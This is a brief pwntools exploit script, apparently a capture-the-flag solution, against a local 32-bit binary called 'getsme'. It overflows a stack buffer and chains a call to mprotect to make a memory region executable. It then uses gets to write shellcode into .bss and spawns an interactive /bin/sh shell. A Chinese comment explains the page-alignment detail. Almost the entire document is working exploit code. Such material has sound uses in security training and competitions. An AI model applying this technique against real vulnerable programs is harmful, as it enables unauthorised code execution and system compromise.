from pwn import *
context(os="linux",arch="i386",log_level="debug")
p=process("./getsme")
elf=ELF("getsme")

def debug():
    gdb.attach(p)
    pause()

mprotect_addr=elf.sym["mprotect"]
print("mprotect :",hex(elf.sym["mprotect"]))
#bss_addr=0x80eb624
bss_addr=0x80eaf80
#bss_addr=0x80e9000
main_addr=elf.sym["main"]
gets_addr=elf.sym["gets"]
pop_edx_ecx_ebx=0x0804ef64
payload1=b"a"*(0x18+4)+p32(mprotect_addr)+p32(pop_edx_ecx_ebx)
payload1+=p32(0x80ea000)+p32(0x10000)+p32(0x7)
#注意这里设置起始地址时后面三位要保证为0，因为在32位中一页为4kb大小，4kb=4096b=0x1000
payload1+=p32(gets_addr)+p32(bss_addr)+p32(bss_addr)
p.recvuntil(b"NAME!\n")
p.sendline(payload1)
#debug()
shellcode=asm(shellcraft.sh())
p.sendline(shellcode)
p.interactive()

